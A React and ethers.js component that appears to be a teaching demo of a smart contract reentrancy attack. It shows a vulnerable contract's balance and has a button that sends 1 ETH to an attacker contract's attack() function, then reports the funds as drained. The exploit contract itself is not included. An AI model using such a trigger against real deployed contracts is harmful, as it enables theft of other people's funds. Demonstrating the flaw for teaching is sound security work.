import { ethers } from "ethers";
import { useState } from "react";

const vulnerableAddress = "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9";
const attackAddress = "0x5FC8d32690cc91D4c39d9d3abcBD16989F875707";

const attackerABI = [
  "function attack() payable",
];

function Reentrancy() {
  const [balance, setBalance] = useState("");
  const [status, setStatus] = useState("");

  const getBalance = async () => {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const bal = await provider.getBalance(vulnerableAddress);
    setBalance(ethers.formatEther(bal));
  };

  const runAttack = async () => {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const attacker = new ethers.Contract(
      attackAddress,
      attackerABI,
      signer
    );

    setStatus("⏳ Attack running...");

    const tx = await attacker.attack({
      value: ethers.parseEther("1"),
    });

    await tx.wait();

    setStatus("💀 Attack successful! Funds drained.");
    console.log("Vulnerable Address:", vulnerableAddress);
    console.log("Attacker Address:", attackAddress);
  };

  return (
    <div>
      <h2>🔥 Reentrancy Attack Demo</h2>

      <button onClick={getBalance}>Check Balance</button>

      <p>
        Contract Balance:{" "}
        <strong style={{ color: balance === "0.0" ? "red" : "green" }}>
          {balance} ETH
        </strong>
      </p>

      <button onClick={runAttack}>Run Attack</button>

      <p>{status}</p>
    </div>
  );
}

export default Reentrancy;